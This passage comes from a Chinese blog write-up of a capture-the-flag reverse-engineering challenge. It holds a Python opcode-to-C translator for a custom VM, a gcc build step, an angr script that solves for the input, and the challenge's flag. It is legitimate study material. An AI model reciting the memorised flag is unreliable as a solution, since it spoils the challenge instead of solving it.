class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0x9</span>:</span><br><span class="line">       v85 = lenth</span><br><span class="line">       v86 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span></span><br><span class="line">       v87 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       v88 = v85 - <span class="number">2</span></span><br><span class="line">       v89 = arr[v85 - <span class="number">2</span>]</span><br><span class="line">       lenth = v88</span><br><span class="line">       v90 = -(v89 &lt; <span class="number">0x40</span>) &amp; (v87 &gt;&gt; v89)</span><br><span class="line">       lenth = v88 + <span class="number">1</span></span><br><span class="line">       arr[v88] = v90</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v88&#125;</span>] = -(arr[<span class="subst">&#123;v85 - <span class="number">2</span>&#125;</span>] &lt; 0x40) &amp; (arr[<span class="subst">&#123;a_len&#125;</span>] &gt;&gt; arr[<span class="subst">&#123;v85 - <span class="number">2</span>&#125;</span>])&quot;</span>)</span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xa</span>:</span><br><span class="line">       v94 = lenth</span><br><span class="line">       v95 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span></span><br><span class="line">       v96 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       lenth = v95 + <span class="number">1</span></span><br><span class="line">       arr[v95] = ~v96</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v95&#125;</span>] = ~arr[<span class="subst">&#123;a_len&#125;</span>]&quot;</span>)</span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xb</span>:</span><br><span class="line">       v101 = lenth</span><br><span class="line">       v102 = lenth - <span class="number">1</span></span><br><span class="line">       a_len = lenth - <span class="number">1</span></span><br><span class="line">       v103 = arr[lenth - <span class="number">1</span>]</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       v104 = v101 - <span class="number">2</span></span><br><span class="line">       v105 = arr[v101 - <span class="number">2</span>] &amp; v103</span><br><span class="line">       lenth = v101 - <span class="number">2</span></span><br><span class="line">       lenth = v104 + <span class="number">1</span></span><br><span class="line">       arr[v104] = v105</span><br><span class="line">       p(<span class="string">f&quot;arr[<span class="subst">&#123;v104&#125;</span>] = arr[<span class="subst">&#123;v101 - <span class="number">2</span>&#125;</span>] &amp; arr[<span class="subst">&#123;a_len&#125;</span>]&quot;</span>)</span><br><span class="line"></span><br><span class="line">       p += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xc</span>:</span><br><span class="line">        <span class="keyword">if</span> flag[scan_len] == <span class="string">&quot;\n&quot;</span>:</span><br><span class="line">            arr[<span class="number">2</span>] = <span class="built_in">ord</span>(flag[scan_len])</span><br><span class="line">            scan_len += <span class="number">1</span></span><br><span class="line">            p(<span class="string">f&quot;arr[2] = 0&quot;</span>)</span><br><span class="line">            p(<span class="string">f&quot;scanf(\&quot;%c\&quot;,&amp;arr[2])&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            arr[<span class="number">0</span>] = <span class="built_in">ord</span>(flag[scan_len])</span><br><span class="line">            scan_len += <span class="number">1</span></span><br><span class="line">            p(<span class="string">f&quot;arr[0] = 0&quot;</span>)</span><br><span class="line">            p(<span class="string">f&quot;scanf(\&quot;%c\&quot;,&amp;arr[0])&quot;</span>)</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">        lenth += <span class="number">1</span></span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xd</span>:</span><br><span class="line">       <span class="keyword">try</span>:</span><br><span class="line">         p(<span class="string">f&quot;// <span class="subst">&#123;<span class="built_in">chr</span>(opode[p+<span class="number">1</span>])&#125;</span>&quot;</span>)</span><br><span class="line">       <span class="keyword">except</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="built_in">hex</span>(p))</span><br><span class="line">       p += <span class="number">2</span></span><br><span class="line">      </span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xe</span>:</span><br><span class="line">       lenth -= <span class="number">1</span></span><br><span class="line">       call = <span class="string">f&#x27;&#x27;&#x27;if (arr[<span class="subst">&#123;lenth&#125;</span>])\n\texit(0)&#x27;&#x27;&#x27;</span></span><br><span class="line">       p(call)</span><br><span class="line">       p +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">elif</span> op == <span class="number">0xcc</span>:</span><br><span class="line">       <span class="built_in">print</span>(<span class="string">&quot;here op == 0xcc&quot;</span>)</span><br><span class="line">       <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       <span class="keyword">assert</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>

<p>运行后得到了一个将近两万行的代码，稍微修一下然后用gcc生成文件</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221117092240038.png" alt="image-20221117092240038"></p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc opcode.c -g -<span class="meta">O3</span> -o opcode</span><br></pre></td></tr></table></figure>

<p>得到的文件如下：</p>
<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20221117092604330.png" alt="image-20221117092604330"></p>
<p>只剩不到300行，直接用z3或者angr进行解决即可，在此采用angr解决：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">argv</span>):</span><br><span class="line">    path_to_binary = <span class="string">&#x27;./opcode&#x27;</span></span><br><span class="line">    project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">    initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">    simulation = project.factory.simgr(initial_state)</span><br><span class="line">    print_good_address = <span class="number">0x01B66</span></span><br><span class="line">    fail_address = <span class="number">0x015AD</span></span><br><span class="line">    simulation.explore(find=print_good_address,avoid=fail_address)</span><br><span class="line">    <span class="keyword">if</span> simulation.found:</span><br><span class="line">        solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(solution_state.posix.dumps(sys.stdin.fileno()))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;Nooooooooooo&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(sys.argv)</span><br></pre></td></tr></table></figure>

<p>找到路径，得到flag：734f1698a5775ec26cd2e11ed4791e77</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="bj777"
      src="/images/bitbug_favicon.ico">
  <p class="site-author-name" itemprop="name">bj777</p>
  <div class="site-description" itemprop="description">一位逆向菜狗</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">43</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
        <span class="site-state-item-count">1</span>
        <span class="site-state-item-name">标签</span>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/jonathanbest7" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;jonathanbest7" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="/506611735@qq.com" title="E-Mail → 506611735@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://www.zhihu.com/people/bang-ji-1" title="知乎 → https:&#x2F;&#x2F;www.zhihu.com&#x2F;people&#x2F;bang-ji-1" rel="noopener" target="_blank"><i class="fab fa-zhihu fa-fw"></i>知乎</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">bj777</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  
		<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
		<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
		<script type="text/javascript" src="/js/src/fireworks.js"></script>
  
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":300,"height":600},"mobile":{"show":false},"rect":"opacity:0.7","log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
</html>
